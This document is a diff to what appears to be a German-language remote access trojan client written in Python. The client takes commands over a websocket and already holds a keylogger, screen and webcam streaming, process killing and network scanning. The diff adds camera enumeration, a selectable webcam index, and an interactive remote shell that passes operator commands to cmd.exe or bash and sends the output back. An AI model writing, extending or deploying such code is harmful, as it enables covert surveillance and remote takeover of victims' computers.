@@ -189,7 +189,7 @@ def get_process_list() -> str:
             output.append(f"{p['pid']}\t{p['cpu_percent']:.2f}\t{p['memory_mb']:.2f}\t{p.get('username', 'N/A')}\t{p['name']}")
         return "\n".join(output)
     except Exception as e:
-        return f"Fehler beim Auflisten der Prozesse: {e}"}
+        return f"Fehler beim Auflisten der Prozesse: {e}"
 
 def kill_process(pid: str) -> str:
     """Beendet einen Prozess anhand seiner PID."""
@@ -345,7 +345,7 @@ class WebcamStreamer:
         self._ws = None
         self._cap = None
 
-    async def start(self, ws):
+    async def start(self, ws, cam_index=0):
         if self._running: return
         
         try:
@@ -359,8 +359,8 @@ class WebcamStreamer:
 
         self._running = True
         self._ws = ws
-        self._task = asyncio.create_task(self._stream())
-        logging.info("Webcam-Streaming gestartet.")
+        self._task = asyncio.create_task(self._stream(cam_index))
+        logging.info(f"Webcam-Streaming von Kamera {cam_index} gestartet.")
 
     async def stop(self):
         self._running = False
@@ -372,11 +372,11 @@ class WebcamStreamer:
             self._cap = None
         logging.info("Webcam-Streaming gestoppt.")
 
-    async def _stream(self):
-        self._cap = cv2.VideoCapture(0)
+    async def _stream(self, cam_index):
+        self._cap = cv2.VideoCapture(cam_index)
         if not self._cap.isOpened():
-            logging.error("Konnte Webcam nicht öffnen.")
-            await self._ws.send(json.dumps({"type": "command_output", "output": "Fehler: Webcam konnte nicht geöffnet werden."}))
+            logging.error(f"Konnte Webcam {cam_index} nicht öffnen.")
+            await self._ws.send(json.dumps({"type": "command_output", "output": f"Fehler: Webcam {cam_index} konnte nicht geöffnet werden."}))
             self._running = False
             return
 
@@ -406,6 +406,95 @@ class WebcamStreamer:
         logging.info("Webcam-Stream-Schleife beendet.")
 
 webcam_streamer = WebcamStreamer()
+
+def list_webcams() -> str:
+    """Listet verfügbare Webcams auf."""
+    try:
+        global cv2
+        import cv2
+    except ImportError:
+        return "Fehler: OpenCV ist auf dem Client nicht installiert."
+
+    try:
+        cams = []
+        for i in range(10): # Prüfe die ersten 10 Indizes
+            cap = cv2.VideoCapture(i)
+            if cap.isOpened():
+                cams.append(f"Kamera {i}: Verfügbar")
+                cap.release()
+            else:
+                cams.append(f"Kamera {i}: Nicht verfügbar oder Ende der Liste")
+                break
+        return "\n".join(cams)
+    except Exception as e:
+        return f"Fehler beim Auflisten der Webcams: {e}"
+
+# === Interaktive Shell ===
+class InteractiveShell:
+    def __init__(self):
+        self._process = None
+        self._running = False
+
+    async def start(self):
+        if self._running:
+            return "Shell läuft bereits."
+        
+        self._running = True
+        shell_cmd = 'cmd.exe' if platform.system() == "Windows" else '/bin/bash'
+        
+        self._process = await asyncio.create_subprocess_shell(
+            shell_cmd,
+            stdin=asyncio.subprocess.PIPE,
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE,
+            cwd=os.getcwd() # Start im aktuellen Verzeichnis
+        )
+        return f"Interaktive Shell gestartet (PID: {self._process.pid})."
+
+    async def execute(self, command: str) -> str:
+        if not self._running or not self._process:
+            return "Fehler: Shell läuft nicht."
+        
+        try:
+            # Befehl an die Shell senden
+            self._process.stdin.write(f"{command}\n".encode())
+            await self._process.stdin.drain()
+            
+            # Warte auf eine kurze Zeit, um die Ausgabe zu sammeln
+            await asyncio.sleep(0.5)
+            
+            # Lese die Ausgabe ohne zu blockieren
+            output = ""
+            while True:
+                try:
+                    line = await asyncio.wait_for(self._process.stdout.readline(), timeout=0.1)
+                    if not line: break
+                    output += line.decode(errors='ignore')
+                except asyncio.TimeoutError:
+                    break
+            
+            # Lese auch stderr
+            stderr_output = ""
+            while True:
+                try:
+                    line = await asyncio.wait_for(self._process.stderr.readline(), timeout=0.1)
+                    if not line: break
+                    stderr_output += line.decode(errors='ignore')
+                except asyncio.TimeoutError:
+                    break
+
+            return output + stderr_output if output or stderr_output else "Befehl ausgeführt."
+
+        except Exception as e:
+            return f"Fehler bei der Shell-Ausführung: {e}"
+
+    def stop(self):
+        if self._process:
+            self._process.terminate()
+        self._running = False
+        return "Shell beendet."
+
+interactive_shell = InteractiveShell()
 
 # === Hauptlogik: Befehlsverarbeitung ===
 async def process_commands(websocket: websockets.ClientConnection):
@@ -447,6 +536,16 @@ async def process_commands(websocket: websockets.ClientConnection):
             elif action == "msgbox": output = show_message_box(command.get("text"))
             elif action == "network_scan":
                 output = await scan_network(command.get("range", "192.168.1.0/24"))
+            elif action == "webcam_list":
+                output = list_webcams()
+            elif action == "shell":
+                cmd_to_run = command.get("command")
+                if cmd_to_run == "start":
+                    output = await interactive_shell.start()
+                elif cmd_to_run == "stop":
+                    output = interactive_shell.stop()
+                else:
+                    output = await interactive_shell.execute(cmd_to_run)
             elif action == "keylogger":
                 if not keyboard or not os.path.exists(KEYLOG_FILE_PATH):
                     output = "Keylogger nicht verfügbar oder keine Daten."
@@ -464,8 +563,9 @@ async def process_commands(websocket: websockets.ClientConnection):
                 await screen_streamer.stop()
                 output = "Screen-Streaming gestoppt."
             elif action == "webcam_start":
-                await webcam_streamer.start(websocket)
-                output = "Webcam-Streaming wird gestartet..."
+                cam_index = int(command.get("index", 0))
+                await webcam_streamer.start(websocket, cam_index)
+                output = f"Webcam-Streaming wird von Kamera {cam_index} gestartet..."
             elif action == "webcam_stop":
                 await webcam_streamer.stop()
                 output = "Webcam-Streaming gestoppt."
